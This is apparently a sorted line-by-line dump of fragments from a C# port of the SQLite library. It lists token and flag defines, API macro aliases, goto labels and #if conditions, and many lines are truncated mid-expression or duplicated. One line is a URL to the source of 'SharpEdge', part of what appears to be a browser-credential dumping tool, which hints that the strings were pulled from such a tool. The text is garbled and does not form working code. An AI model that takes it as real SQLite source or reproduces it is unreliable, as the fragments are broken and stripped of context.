define SQLITE_TOOBIG      18   /
define SQLITE_TRANSACTION          22   /
define SQLITE_TRANSIENT   ((sqlite3_destructor_type)-1)
define SQLITE_UPDATE               23   /
define SQLITE_UTF16          4    /
define SQLITE_UTF16BE        3
define SQLITE_UTF16LE        2
define SQLITE_UTF16NATIVE  SQLITE_UTF16LE
define SQLITE_UTF16NATIVE (SQLITE_BIGENDIAN
define SQLITE_UTF16_ALIGNED  8    /
define SQLITE_UTF8           1
define SQLITE_VERSION_NUMBER  3006017
define SQLITE_VdbeListing    0x00000400  /
define SQLITE_VdbeTrace      0x00000001  /
define SQLITE_WSD
define SQLITE_WSD const
define SQLITE_WriteSchema    0x00000800  /
define SRT_Coroutine   10  /
define SRT_Discard    4  /
define SRT_EphemTab  9  /
define SRT_Except      2  /
define SRT_Exists      3  /
define SRT_Mem            6  /
define SRT_Output      5  /
define SRT_Set            7  /
define SRT_Table        8  /
define SRT_Union        1  /
define SimulateDiskfullError(A)
define SimulateDiskfullError(CODE) 
define SimulateIOError(A)
define SimulateIOError(CODE)  
define SimulateIOErrorBenign(X)
define TERM_ANDINFO    0x20   /
define TERM_CODED      0x04   /
define TERM_COPIED     0x08   /
define TERM_DYNAMIC    0x01   /
define TERM_ORINFO     0x10   /
define TERM_OR_OK      0x40   /
define TERM_VIRTUAL    0x02   /
define TF_Autoincrement   0x08    /
define TF_Ephemeral       0x02    /
define TF_HasPrimaryKey   0x04    /
define TF_NeedMetadata    0x20    /
define TF_Readonly        0x01    /
define TF_Virtual         0x10    /
define TIMER_ELAPSED     ((sqlite_u3264)0)
define TIMER_ELAPSED     g_elapsed
define TIMER_END
define TIMER_END         g_elapsed=sqlite3Hwtime()-g_start
define TIMER_START
define TIMER_START       g_start=sqlite3Hwtime()
define TK_ABORT                          28
define TK_ADD                            140
define TK_AFTER                          29
define TK_AGG_COLUMN                     153
define TK_AGG_FUNCTION                   152
define TK_ALL                            113
define TK_ALTER                          139
define TK_ANALYZE                        30
define TK_AND                            67
define TK_ANY                            65
define TK_AS                             24
define TK_ASC                            31
define TK_ATTACH                         32
define TK_AUTOINCR                       103
define TK_BEFORE                         33
define TK_BEGIN                           5
define TK_BETWEEN                        69
define TK_BITAND                         80
define TK_BITNOT                         93
define TK_BITOR                          81
define TK_BLOB                           131
define TK_BY                             34
define TK_CASCADE                        35
define TK_CASE                           134
define TK_CAST                           36
define TK_CHECK                          101
define TK_COLLATE                        90
define TK_COLUMN                         151
define TK_COLUMNKW                       37
define TK_COMMA                          25
define TK_COMMIT                         10
define TK_CONCAT                         89
define TK_CONFLICT                       38
define TK_CONSTRAINT                     96
define TK_CONST_FUNC                     154
define TK_CREATE                         17
define TK_CTIME_KW                       64
define TK_DATABASE                       39
define TK_DEFAULT                        97
define TK_DEFERRABLE                     109
define TK_DEFERRED                        7
define TK_DELETE                         105
define TK_DESC                           40
define TK_DETACH                         41
define TK_DISTINCT                       117
define TK_DOT                            118
define TK_DROP                           111
define TK_EACH                           42
define TK_ELSE                           137
define TK_END                            11
define TK_END_OF_FILE                    146
define TK_EQ                             74
define TK_ESCAPE                         79
define TK_EXCEPT                         114
define TK_EXCLUSIVE                       9
define TK_EXISTS                         20
define TK_EXPLAIN                         2
define TK_FAIL                           43
define TK_FLOAT                          130
define TK_FOR                            44
define TK_FOREIGN                        110
define TK_FROM                           119
define TK_FUNCTION                       150
define TK_GE                             78
define TK_GROUP                          123
define TK_GT                             75
define TK_HAVING                         124
define TK_ID                             26
define TK_IF                             18
define TK_IGNORE                         45
define TK_ILLEGAL                        147
define TK_IMMEDIATE                       8
define TK_IN                             70
define TK_INDEX                          138
define TK_INDEXED                        27
define TK_INITIALLY                      46
define TK_INSERT                         107
define TK_INSTEAD                        47
define TK_INTEGER                        129
define TK_INTERSECT                      115
define TK_INTO                           127
define TK_IS                             68
define TK_ISNULL                         71
define TK_JOIN                           120
define TK_JOIN_KW                        95
define TK_KEY                            50
define TK_LE                             76
define TK_LIKE_KW                        48
define TK_LIMIT                          125
define TK_LP                             22
define TK_LSHIFT                         82
define TK_LT                             77
define TK_MATCH                          49
define TK_MINUS                          85
define TK_NE                             73
define TK_NOT                            19
define TK_NOTNULL                        72
define TK_NULL                           98
define TK_OF                             51
define TK_OFFSET                         52
define TK_ON                             104
define TK_OR                             66
define TK_ORDER                          122
define TK_PLAN                            4
define TK_PLUS                           84
define TK_PRAGMA                         53
define TK_PRIMARY                        99
define TK_QUERY                           3
define TK_RAISE                          54
define TK_REFERENCES                     102
define TK_REGISTER                       132
define TK_REINDEX                        62
define TK_RELEASE                        14
define TK_REM                            88
define TK_RENAME                         63
define TK_REPLACE                        55
define TK_RESTRICT                       56
define TK_ROLLBACK                       12
define TK_ROW                            57
define TK_RP                             23
define TK_RSHIFT                         83
define TK_SAVEPOINT                      13
define TK_SELECT                         116
define TK_SEMI                            1
define TK_SET                            108
define TK_SLASH                          87
define TK_SPACE                          148
define TK_STAR                           86
define TK_STRING                         94
define TK_TABLE                          16
define TK_TEMP                           21
define TK_THEN                           136
define TK_TO                             15
define TK_TO_BLOB                        142
define TK_TO_INT                         144
define TK_TO_NUMERIC                     143
define TK_TO_REAL                        145
define TK_TO_TEXT                        141
define TK_TRANSACTION                     6
define TK_TRIGGER                        58
define TK_UMINUS                         91
define TK_UNCLOSED_STRING                149
define TK_UNION                          112
define TK_UNIQUE                         100
define TK_UPDATE                         106
define TK_UPLUS                          92
define TK_USING                          121
define TK_VACUUM                         59
define TK_VALUES                         128
define TK_VARIABLE                       133
define TK_VIEW                           60
define TK_VIRTUAL                        61
define TK_WHEN                           135
define TK_WHERE                          126
define TOKEN (yyminor.yy0)
define TRACE_IDX_INPUTS(A)
define TRACE_IDX_OUTPUTS(A)
define TRANSLATE_TRACE 1 
define TRIGGER_AFTER   2
define TRIGGER_BEFORE  1
define UNPACKED_IGNORE_ROWID  0x0004  /
define UNPACKED_INCRKEY       0x0008  /
define UNPACKED_NEED_DESTROY  0x0002  /
define UNPACKED_NEED_FREE     0x0001  /
define UNPACKED_PREFIX_MATCH  0x0010  /
define UNPACKED_PREFIX_SEARCH 0x0020  /
define UNUSED_PARAMETER(x) (void)(x)
define UpperToLower sqlite3UpperToLower
define VDBE_MAGIC_DEAD     0xb606c3c8    /
define VDBE_MAGIC_HALT     0x519c2973    /
define VDBE_MAGIC_INIT     0x26bceaa5    /
define VDBE_MAGIC_RUN      0xbdf20da3    /
define WHERE_BTM_LIMIT    0x00200000  /
define WHERE_COLUMN_EQ    0x00010000  /
define WHERE_COLUMN_IN    0x00040000  /
define WHERE_COLUMN_NULL  0x00080000  /
define WHERE_COLUMN_RANGE 0x00020000  /
define WHERE_DUPLICATES_OK    0x0008 /
define WHERE_FORCE_TABLE      0x0040 /
define WHERE_IDX_ONLY     0x00800000  /
define WHERE_INDEXED      0x000f0000  /
define WHERE_IN_ABLE      0x000f1000  /
define WHERE_MULTI_OR     0x10000000  /
define WHERE_OMIT_CLOSE       0x0020  /
define WHERE_OMIT_OPEN        0x0010  /
define WHERE_ONEPASS_DESIRED  0x0004 /
define WHERE_ORDERBY      0x01000000  /
define WHERE_ORDERBY_MAX      0x0002 /
define WHERE_ORDERBY_MIN      0x0001 /
define WHERE_ORDERBY_NORMAL   0x0000 /
define WHERE_REVERSE      0x02000000  /
define WHERE_ROWID_EQ     0x00001000  /
define WHERE_ROWID_RANGE  0x00002000  /
define WHERE_TOP_LIMIT    0x00100000  /
define WHERE_UNIQUE       0x04000000  /
define WHERE_VIRTUALTABLE 0x08000000  /
define WINCE_DELETION_ATTEMPTS 3
define WO_ALL    0xfff       /
define WO_AND    0x200       /
define WO_EQ     0x002
define WO_GE     (WO_EQ<<(TK_GE-TK_EQ))
define WO_GT     (WO_EQ<<(TK_GT-TK_EQ))
define WO_IN     0x001
define WO_ISNULL 0x080
define WO_LE     (WO_EQ<<(TK_LE-TK_EQ))
define WO_LT     (WO_EQ<<(TK_LT-TK_EQ))
define WO_MATCH  0x040
define WO_OR     0x100       /
define WO_SINGLE 0x0ff       /
define WRC_Abort       2   /
define WRC_Continue    0   /
define WRC_Prune       1   /
define WRITE_LOCK    2
define YYACTIONTYPE unsigned short int
define YYCODETYPE unsigned short char
define YYFALLBACK
define YYNOERRORRECOVERY 1
define YYWILDCARD
define _BTREE_H_
define _GNU_SOURCE
define _HWTIME_H_
define _OS_COMMON_H_
define _PAGER_H_
define _SQLITE3EXT_H_
define _SQLITE3_H_
define _SQLITEINT_H_
define _SQLITE_HASH_H_
define _SQLITE_OS_C_ 1
define _SQLITE_OS_H_
define _SQLITE_VDBE_H_
define _VDBEINT_H_
define _XOPEN_SOURCE 500  /
define assertCellInfo(x)
define assertMutexHeld() 
define btreeIntegrity(p) 
define checkActiveVdbeCnt(x)
define clearAllSharedCacheTableLocks(a)
define codeTableLocks(x)
define downgradeAllSharedCacheTableLocks(a)
define etCHARX       9 /
define etDYNSTRING   7 /
define etEXP         3 /
define etFLOAT       2 /
define etGENERIC     4 /
define etINVALID     0 /
define etORDINAL    16 /
define etPERCENT     8 /
define etPOINTER    14 /
define etRADIX       1 /
define etSIZE        5 /
define etSQLESCAPE  10 /
define etSQLESCAPE2 11 /
define etSQLESCAPE3 15 /
define etSRCLIST    13 /
define etSTRING      6 /
define etTOKEN      12 /
define expandBlob(P) (((P)->flags
define exprSetHeight(y)
define get2byte(x)   ((x)[0]<<8 
define get4byte sqlite3Get4byte
define getCellInfo(pCur)                                                      
define getValue sqlite3AtoF
define getVarint    sqlite3GetVarint
define invalidateAllOverflowCache(x)
define invalidateOverflowCache(x)
define isOpen(pFd) ((pFd)->pMethods)
define pager_pagehash(X)  0
define pcache1EnterMutex() sqlite3_mutex_enter(pcache1.mutex)
define pcache1LeaveMutex() sqlite3_mutex_leave(pcache1.mutex)
define put4byte sqlite3Put4byte
define putVarint    sqlite3PutVarint
define restoreCursorPosition(p) 
define sqlite3BeginBenignMalloc()
define sqlite3ConnectionClosed(x)
define sqlite3ConnectionUnlocked(x)
define sqlite3DebugPrintf printf
define sqlite3EndBenignMalloc()
define sqlite3GlobalConfig sqlite3Config
define sqlite3IsNumericAffinity(X)  ((X)>=SQLITE_AFF_NUMERIC)
define sqlite3JournalSize(pVfs) ((pVfs)->szOsFile)
define sqlite3Malloc                 sqlite3_api->malloc
define sqlite3MutexAlloc            sqlite3_api->mutex_alloc
define sqlite3MutexAlloc(X)      ((sqlite3_mutex
define sqlite3MutexEnd()
define sqlite3MutexInit()        SQLITE_OK
define sqlite3ParserARG_FETCH Parse pParse = yypParser.pParse
define sqlite3ParserARG_SDECL Parse pParse
define sqlite3ParserARG_STORE yypParser.pParse = pParse
define sqlite3ParserTOKENTYPE Token
define sqlite3SelectExprHeight(x) 0
define sqlite3StrNICmp sqlite3_strnicmp
define sqlite3VdbeIOTraceSql(X)
define sqlite3VdbeMemExpandBlob(x) SQLITE_OK
define sqlite3_aggregate_context      sqlite3_api->aggregate_context
define sqlite3_aggregate_count        sqlite3_api->aggregate_count
define sqlite3_bind_blob              sqlite3_api->bind_blob
define sqlite3_bind_double            sqlite3_api->bind_double
define sqlite3_bind_int               sqlite3_api->bind_int
define sqlite3_bind_int64             sqlite3_api->bind_int64
define sqlite3_bind_null              sqlite3_api->bind_null
define sqlite3_bind_parameter_count   sqlite3_api->bind_parameter_count
define sqlite3_bind_parameter_index   sqlite3_api->bind_parameter_index
define sqlite3_bind_parameter_name    sqlite3_api->bind_parameter_name
define sqlite3_bind_text              sqlite3_api->bind_text
define sqlite3_bind_text16            sqlite3_api->bind_text16
define sqlite3_bind_value             sqlite3_api->bind_value
define sqlite3_bind_zeroblob          sqlite3_api->bind_zeroblob
define sqlite3_bind_zeroblob  0
define sqlite3_blob_bytes             sqlite3_api->blob_bytes
define sqlite3_blob_bytes     0
define sqlite3_blob_close             sqlite3_api->blob_close
define sqlite3_blob_close     0
define sqlite3_blob_open              sqlite3_api->blob_open
define sqlite3_blob_open      0
define sqlite3_blob_read              sqlite3_api->blob_read
define sqlite3_blob_read      0
define sqlite3_blob_write             sqlite3_api->blob_write
define sqlite3_blob_write     0
define sqlite3_busy_handler           sqlite3_api->busy_handler
define sqlite3_busy_timeout           sqlite3_api->busy_timeout
define sqlite3_changes                sqlite3_api->changes
define sqlite3_clear_bindings         sqlite3_api->clear_bindings
define sqlite3_close                  sqlite3_api->close
define sqlite3_collation_needed       sqlite3_api->collation_needed
define sqlite3_collation_needed16     sqlite3_api->collation_needed16
define sqlite3_column_blob            sqlite3_api->column_blob
define sqlite3_column_bytes           sqlite3_api->column_bytes
define sqlite3_column_bytes16         sqlite3_api->column_bytes16
define sqlite3_column_count           sqlite3_api->column_count
define sqlite3_column_database_name   sqlite3_api->column_database_name
define sqlite3_column_database_name16 sqlite3_api->column_database_name16
define sqlite3_column_decltype        sqlite3_api->column_decltype
define sqlite3_column_decltype16      sqlite3_api->column_decltype16
define sqlite3_column_double          sqlite3_api->column_double
define sqlite3_column_int             sqlite3_api->column_int
define sqlite3_column_int64           sqlite3_api->column_int64
define sqlite3_column_name            sqlite3_api->column_name
define sqlite3_column_name16          sqlite3_api->column_name16
define sqlite3_column_origin_name     sqlite3_api->column_origin_name
define sqlite3_column_origin_name16   sqlite3_api->column_origin_name16
define sqlite3_column_table_name      sqlite3_api->column_table_name
define sqlite3_column_table_name16    sqlite3_api->column_table_name16
define sqlite3_column_text            sqlite3_api->column_text
define sqlite3_column_text16          sqlite3_api->column_text16
define sqlite3_column_type            sqlite3_api->column_type
define sqlite3_column_value           sqlite3_api->column_value
define sqlite3_commit_hook            sqlite3_api->commit_hook
define sqlite3_complete               sqlite3_api->complete
define sqlite3_complete16             sqlite3_api->complete16
define sqlite3_context_db_handle      sqlite3_api->context_db_handle
define sqlite3_create_collation       sqlite3_api->create_collation
define sqlite3_create_collation16     sqlite3_api->create_collation16
define sqlite3_create_collation_v2    sqlite3_api->create_collation_v2
define sqlite3_create_function        sqlite3_api->create_function
define sqlite3_create_function16      sqlite3_api->create_function16
define sqlite3_create_module          sqlite3_api->create_module
define sqlite3_create_module_v2       sqlite3_api->create_module_v2
define sqlite3_data_count             sqlite3_api->data_count
define sqlite3_db_handle              sqlite3_api->db_handle
define sqlite3_declare_vtab           sqlite3_api->declare_vtab
define sqlite3_enable_shared_cache    sqlite3_api->enable_shared_cache
define sqlite3_errcode                sqlite3_api->errcode
define sqlite3_errmsg                 sqlite3_api->errmsg
define sqlite3_errmsg16               sqlite3_api->errmsg16
define sqlite3_exec                   sqlite3_api->exec
define sqlite3_expired                sqlite3_api->expired
define sqlite3_extended_result_codes  sqlite3_api->extended_result_codes
define sqlite3_file_control           sqlite3_api->file_control
define sqlite3_finalize               sqlite3_api->finalize
define sqlite3_get_autocommit         sqlite3_api->get_autocommit
define sqlite3_get_auxdata            sqlite3_api->get_auxdata
define sqlite3_get_table              sqlite3_api->get_table
define sqlite3_global_recover         sqlite3_api->global_recover
define sqlite3_interrupt              sqlite3_api->interruptx
define sqlite3_last_insert_rowid      sqlite3_api->last_insert_rowid
define sqlite3_libversion             sqlite3_api->libversion
define sqlite3_libversion_number      sqlite3_api->libversion_number
define sqlite3_limit                  sqlite3_api->limit
define sqlite3_memory_highwater       sqlite3_api->memory_highwater
define sqlite3_memory_used            sqlite3_api->memory_used
define sqlite3_mprintf                sqlite3_api->mprintf
define sqlite3_mutex_alloc(X)    ((sqlite3_mutex
define sqlite3_mutex_enter            sqlite3_api->mutex_enter
define sqlite3_mutex_enter(X)
define sqlite3_mutex_free             sqlite3_api->mutex_free
define sqlite3_mutex_free(X)
define sqlite3_mutex_held(X)     1
define sqlite3_mutex_leave            sqlite3_api->mutex_leave
define sqlite3_mutex_leave(X)
define sqlite3_mutex_notheld(X)  1
define sqlite3_mutex_try              sqlite3_api->mutex_try
define sqlite3_mutex_try(X)      SQLITE_OK
define sqlite3_next_stmt              sqlite3_api->next_stmt
define sqlite3_open                   sqlite3_api.open
define sqlite3_open16                 sqlite3_api.open16
define sqlite3_open_v2                sqlite3_api.open_v2
define sqlite3_overload_function      sqlite3_api->overload_function
define sqlite3_prepare                sqlite3_api.prepare
define sqlite3_prepare16              sqlite3_api.prepare16
define sqlite3_prepare16_v2           sqlite3_api.prepare16_v2
define sqlite3_prepare_v2             sqlite3_api.prepare_v2
define sqlite3_profile                sqlite3_api.profile
define sqlite3_progress_handler       sqlite3_api.progress_handler
define sqlite3_randomness             sqlite3_api->randomness
define sqlite3_realloc                sqlite3_api->realloc
define sqlite3_release_memory         sqlite3_api->release_memory
define sqlite3_reset                  sqlite3_api->reset
define sqlite3_result_blob            sqlite3_api->result_blob
define sqlite3_result_double          sqlite3_api->result_double
define sqlite3_result_error           sqlite3_api->result_error
define sqlite3_result_error16         sqlite3_api->result_error16
define sqlite3_result_error_code      sqlite3_api->result_error_code
define sqlite3_result_error_nomem     sqlite3_api->result_error_nomem
define sqlite3_result_error_toobig    sqlite3_api->result_error_toobig
define sqlite3_result_int             sqlite3_api->result_int
define sqlite3_result_int64           sqlite3_api->result_int64
define sqlite3_result_null            sqlite3_api->result_null
define sqlite3_result_text            sqlite3_api->result_text
define sqlite3_result_text16          sqlite3_api->result_text16
define sqlite3_result_text16be        sqlite3_api->result_text16be
define sqlite3_result_text16le        sqlite3_api->result_text16le
define sqlite3_result_value           sqlite3_api->result_value
define sqlite3_result_zeroblob        sqlite3_api->result_zeroblob
define sqlite3_rollback_hook          sqlite3_api->rollback_hook
define sqlite3_set_authorizer         sqlite3_api->set_authorizer
define sqlite3_set_auxdata            sqlite3_api->set_auxdata
define sqlite3_sleep                  sqlite3_api->sleep
define sqlite3_snprintf               sqlite3_api->snprintf
define sqlite3_soft_heap_limit        sqlite3_api->soft_heap_limit
define sqlite3_sql                    sqlite3_api->sql
define sqlite3_status                 sqlite3_api->status
define sqlite3_step                   sqlite3_api->step
define sqlite3_table_column_metadata  sqlite3_api->table_column_metadata
define sqlite3_test_control           sqlite3_api->test_control
define sqlite3_thread_cleanup         sqlite3_api->thread_cleanup
define sqlite3_threadsafe             sqlite3_api->xthreadsafe
define sqlite3_total_changes          sqlite3_api->total_changes
define sqlite3_trace                  sqlite3_api->trace
define sqlite3_transfer_bindings      sqlite3_api->transfer_bindings
define sqlite3_update_hook            sqlite3_api->update_hook
define sqlite3_user_data              sqlite3_api->user_data
define sqlite3_value_blob             sqlite3_api->value_blob
define sqlite3_value_bytes            sqlite3_api->value_bytes
define sqlite3_value_bytes16          sqlite3_api->value_bytes16
define sqlite3_value_double           sqlite3_api->value_double
define sqlite3_value_int              sqlite3_api->value_int
define sqlite3_value_int64            sqlite3_api->value_int64
define sqlite3_value_numeric_type     sqlite3_api->value_numeric_type
define sqlite3_value_text             sqlite3_api->value_text
define sqlite3_value_text16           sqlite3_api->value_text16
define sqlite3_value_text16be         sqlite3_api->value_text16be
define sqlite3_value_text16le         sqlite3_api->value_text16le
define sqlite3_value_type             sqlite3_api->value_type
define sqlite3_vfs_find               sqlite3_api->vfs_find
define sqlite3_vfs_register           sqlite3_api->vfs_register
define sqlite3_vfs_unregister         sqlite3_api->vfs_unregister
define sqlite3_vmprintf               sqlite3_api->vmprintf
define sqliteHashCount(H)  ((H)->count) // NOT USED 
define sqliteHashData(E)   ((E).data)
define sqliteHashFirst(H)  ((H).first)
define sqliteHashKey(E)    ((E)->pKey) // NOT USED 
define sqliteHashKeysize(E) ((E)->nKey)  // NOT USED 
define sqliteHashNext(E)   ((E).next)
define temp_master_schema 0
define vfsList GLOBAL(sqlite3_vfs 
define winceMutexRelease(h) ReleaseMutex(h)
define yytestcase(X) testcase(X)
defined SQLITE_UTF
defined(SQLITE_MEMDEBUG)
defined(SQLITE_MMAP_HEAP_SIZE)
defines in
defines in sqlite3.h.
defines should enable >2GB file support on POSIX if the
defines specify the range of bytes used for locking.
defines that give unique integer values to each
defines that prevent SQLite from building on Win98.
delete_from_cleanup:
delmaster_out:
dest.nMem-1.
detach_error:
do {
doesStatementRollback = 1
double rT
drop_trigger_cleanup:
dummy 
dwFileOffsetLow < SHARED_FIRST 
dwFlags == 1 
dwFlagsAndAttributes 
dwFlagsAndAttributes = FILE_ATTRIBUTE_HIDDEN
dxDel xDel
dxFinal xFinal  //)(sqlite3_context
eLock==WRITE_LOCK
elif  (_MSC_VER)
elif !NDEBUG
elif ( (__GNUC__) 
elif ((__GNUC__) 
elif (HAVE_LOCALTIME_S)
elif (YYNOERRORRECOVERY)
elif SQLITE_OS_OS2
elif defined(_MSC_VER) 
else
else  //
else  // 
else //
else // 
else if ( nFarg > 0 )
else if (dwFileOffsetLow == PENDING_BYTE 
else if (dwFileOffsetLow == RESERVED_BYTE 
else if (dwFileOffsetLow == SHARED_FIRST 
else if (pFile.local.nReaders){
else if( (pLevel.plan.wsFlags 
else{
enable_shared_cache)(int)
enc = SQLITE_UTF16BE
enc = SQLITE_UTF16NATIVE
end_getDigits:
end_of_step:
end_of_vacuum:
end_playback:
end_prepare:
endif
endif    //
endif  /
endif  //
endif  // 
endif /
endif //
endif // 
endif ///
enterMutex()
entry
ephemTab = pParse.nTab
errcode)(sqlite3
errmsg                              /
errmsg is left pointing at once the error
errmsg)(sqlite3
errmsg16)(sqlite3
error Need implementation of sqlite3Hwtime() for your platform.
error and use the following
error_out:
exclusive)
exec)(sqlite3
exec_out:
exists )
exit_begin_add_column:
exit_create_index:
exit_drop_index:
exit_drop_table:
exit_rename_table:
expensive_assert( pcacheCheckSynced(p) )
expensive_assert( pcacheCheckSynced(pCache) )
expired)(sqlite3_stmt
extended_result_codes)(sqlite3
extern int sqlite3CodecAttach(sqlite3
extern int sqlite3Fts1Init(sqlite3
extern int sqlite3Fts2Init(sqlite3
extern int sqlite3IcuInit(sqlite3
extern void sqlite3CodecGetKey(sqlite3
extern void sqlite3_activate_cerod(const char
extern void sqlite3_activate_see(const char
f' )
failed:
fclose(out)
fetch_out:
fflush(stdout)
file_control)(sqlite3
finalize)(sqlite3_stmt
fk_end:
for (
for ( i = 0 
for ( iEnc = 0 
for ( j = 0 
for ( j = 1 
for ( k = 0 
for ( pIdx = pTab.pIndex 
for(
for(i = 0
for(i=0
for(i=sqliteHashFirst(
for(iCol=0
for(iDb=db.nDb-1
for(ii=1
for(ii=szPageDflt
for(j=0
for(j=1
for(j=pArray->nMutex
for(p2=sqlite3BlockedList
for(p=db->pBlockingConnection
for(p=pBt.pCursor
for(p=pBtree.pBt.pCursor
for(p=pCache.pDirtyTail
for(p=sqlite3BlockedList
for(p=sqliteHashFirst(pSchema.idxHash)
for(pBt=GLOBAL(BtShared
for(pIter=pBt.pLock
for(pLater = p->pNext
for(pLater=p->pNext
for(pLock=pBt.pLock
for(pLock=pBtree.pBt.pLock
for(pVdbe=db.pVdbe
for(pp=
free(pFile.zDeleteOnClose)
free(zConverted)
free(zName)
free)(void
free_table)(char
ft)){
get { return _flags
get { return _i
get { return _n
get { return _op
get { return _p1
get { return _p2
get { return _p3
get { return _z
get { return _zToken
get_autocommit)(sqlite3
get_auxdata)(sqlite3_context
get_table)(sqlite3
global_recover)(void)
goto abort_due_to_misuse
goto attach_end
goto begin_table_error
goto btree_open_out
goto error_out
goto exit_create_index
goto exit_drop_index
goto exit_drop_table
goto exit_rename_table
goto freepage_out
goto insert_cleanup
goto limit_where_cleanup_2
goto pager_acquire_err
goto pragma_out
goto too_big
goto trans_begun
goto trigger_cleanup
goto update_cleanup
hash = (hash
hello
history
http://github.com/
http://github.com/ 
http://go.microsoft.com/fwlink/p/
https://github.com/ 
https://github.com/djhohnstein/SharpWeb/raw/master/Edge/SharpEdge.cs
https://github.com/john
https://github.com/join
https://github.com/login
https://github.com/login 
https://github.com/sign
i = SQLITE_CREATE_INDEX
i = System.DateTime.UtcNow.Millisecond
i for the i-th cursor.
i for the i-th index.
i=sqliteHashNext(i)){
iAmt)
iAmt) ){
iAmt)>p.nBuf ){
iArg
iCnt
iCnt = 0
iCol = pTab.iPKey
iDivisor
iDivisor.  Each subbitmap is normalized
iDivisor.  apSub[N] holds values between
iDummy = zRight[0]
iIdx = (offset/ovflSize)
iOffset)
iOfst)>p->iSize ){
iQuery = (int)pQuery.u.i
iReg = 
iReg = pParse.aAlias[iAlias - 1]
iTab = iRoot
iTab = pIdx.pTable.tnum
iTab==1 )
i]) ){
idxStr
idx_rowid_corruption:
if   !SQLITE_OMIT_LOCALTIME
if  !(SQLITE_OMIT_OR_OPTIMIZATION) 
if  !(SQLITE_OMIT_VIRTUALTABLE) 
if  !NDEBUG
if  !SQLITE_OMIT_ANALYZE
if  !SQLITE_OMIT_AUTOINIT
if  !SQLITE_OMIT_AUTOVACUUM
if  !SQLITE_OMIT_BETWEEN_OPTIMIZATION
if  !SQLITE_OMIT_COMPOUND_SELECT
if  !SQLITE_OMIT_EXPLAIN
if  !SQLITE_OMIT_FLOATING_POINT
if  !SQLITE_OMIT_LIKE_OPTIMIZATION
if  !SQLITE_OMIT_OR_OPTIMIZATION
if  !SQLITE_OMIT_SUBQUERY
if  !SQLITE_OMIT_TRACE
if  !SQLITE_OMIT_UTF16
if  !SQLITE_OMIT_VACUUM 
if  !SQLITE_OMIT_VIRTUALTABLE
if  (SQLITE_TEST)
if  (SQLITE_TEST) 
if  FALSE
if  HAVE_LOCALTIME_R
if  SQLITE_ASCII
if  SQLITE_DEBUG
if  SQLITE_DEFAULT_LOCKING_MODE
if  SQLITE_EBCDIC
if  SQLITE_ENABLE_COLUMN_METADATA
if  SQLITE_ENABLE_FTS1
if  SQLITE_ENABLE_FTS2
if  SQLITE_ENABLE_FTS3
if  SQLITE_ENABLE_ICU
if  SQLITE_ENABLE_LOAD_EXTENSION
if  SQLITE_ENABLE_MEMORY_MANAGEMENT
if  SQLITE_MIXED_ENDIAN_64BIT_FLOAT
if  SQLITE_OMIT_AUTOVACUUM
if  SQLITE_OMIT_DATETIME_FUNCS
if  SQLITE_OMIT_INCRBLOB
if  SQLITE_OMIT_TRIGGER
if  SQLITE_OMIT_UTF16
if  SQLITE_OMIT_VIEW
if  SQLITE_TEST
if  SQLITE_THREADSAFE
if  VDBE_PROFILE
if  VDBE_PROFILE 
if ! MIN
if ! SQLITE_OMIT_AUTHORIZATION
if ! SQLITE_OMIT_AUTOINCREMENT
if ! SQLITE_OMIT_DISKIO
if ! SQLITE_OMIT_EXPLAIN
if ! SQLITE_OMIT_LOAD_EXTENSION
if ! SQLITE_OMIT_UTF16
if ! SQLITE_OMIT_VIRTUALTABLE
if !(HAVE_LOCALTIME_R) 
if !(SQLITE_DEFAULT_MEMSTATUS)
if !(SQLITE_ENABLE_LOCKING_STYLE)
if !(SQLITE_ENABLE_OVERSIZE_CELL_CHECK)
if !(SQLITE_HAVE_ISNAN)
if !(SQLITE_MALLOC_SOFT_LIMIT)
if !(SQLITE_OMIT_PAGER_PRAGMAS) 
if !(SQLITE_OMIT_SHARED_CACHE) 
if !(SQLITE_OMIT_SUBQUERY) 
if !(SQLITE_OMIT_VIEW) 
if !(SQLITE_OS_UNIX) 
if !INT16_TYPE
if !INT8_TYPE
if !INTERFACE
if !INVALID_FILE_ATTRIBUTES
if !INVALID_SET_FILE_POINTER
if !LONGDOUBLE_TYPE
if !MIN
if !NDEBUG
if !NDEBUG 
if !NDEBUG  //
if !SET_FULLSYNC
if !SQLITE_AMALGAMATION
if !SQLITE_BIG_DBL
if !SQLITE_CORE
if !SQLITE_DEFAULT_AUTOVACUUM
if !SQLITE_DEFAULT_CACHE_SIZE
if !SQLITE_DEFAULT_FILE_FORMAT
if !SQLITE_DEFAULT_JOURNAL_SIZE_LIMIT
if !SQLITE_DEFAULT_PAGE_SIZE
if !SQLITE_DEFAULT_SECTOR_SIZE
if !SQLITE_DEFAULT_TEMP_CACHE_SIZE
if !SQLITE_DISABLE_LFS
if !SQLITE_ENABLE_ATOMIC_WRITE
if !SQLITE_ENABLE_COLUMN_METADATA
if !SQLITE_FILE_HEADER //
if !SQLITE_INTEGRITY_CHECK_ERROR_MAX
if !SQLITE_MAX_ATTACHED
if !SQLITE_MAX_COLUMN
if !SQLITE_MAX_COMPOUND_SELECT
if !SQLITE_MAX_DEFAULT_PAGE_SIZE
if !SQLITE_MAX_EXPR_DEPTH
if !SQLITE_MAX_FUNCTION_ARG
if !SQLITE_MAX_LENGTH
if !SQLITE_MAX_LIKE_PATTERN_LENGTH
if !SQLITE_MAX_PAGE_COUNT
if !SQLITE_MAX_PAGE_SIZE
if !SQLITE_MAX_SQL_LENGTH
if !SQLITE_MAX_VARIABLE_NUMBER
if !SQLITE_MAX_VDBE_OP
if !SQLITE_MUTEX_OMIT
if !SQLITE_NO_SYNC
if !SQLITE_N_COLCACHE
if !SQLITE_OMIT_ALTERTABLE
if !SQLITE_OMIT_ANALYZE
if !SQLITE_OMIT_ATTACH
if !SQLITE_OMIT_AUTHORIZATION
if !SQLITE_OMIT_AUTOINCREMENT
if !SQLITE_OMIT_AUTOINIT
if !SQLITE_OMIT_AUTOVACUUM
if !SQLITE_OMIT_AUTOVACUUM //   if ( ISAUTOVACUUM )
if !SQLITE_OMIT_BLOB_LITERAL
if !SQLITE_OMIT_BLOB_LITERAL 
if !SQLITE_OMIT_BTREECOUNT
if !SQLITE_OMIT_BUILTIN_TEST
if !SQLITE_OMIT_CAST
if !SQLITE_OMIT_CHECK
if !SQLITE_OMIT_COMPLETE
if !SQLITE_OMIT_COMPOUND_SELECT
if !SQLITE_OMIT_DATETIME_FUNCS
if !SQLITE_OMIT_DECLTYPE
if !SQLITE_OMIT_DEPRECATED
if !SQLITE_OMIT_DISKIO
if !SQLITE_OMIT_EXPLAIN
if !SQLITE_OMIT_EXPLAIN 
if !SQLITE_OMIT_FLAG_PRAGMAS
if !SQLITE_OMIT_FLOATING_POINT
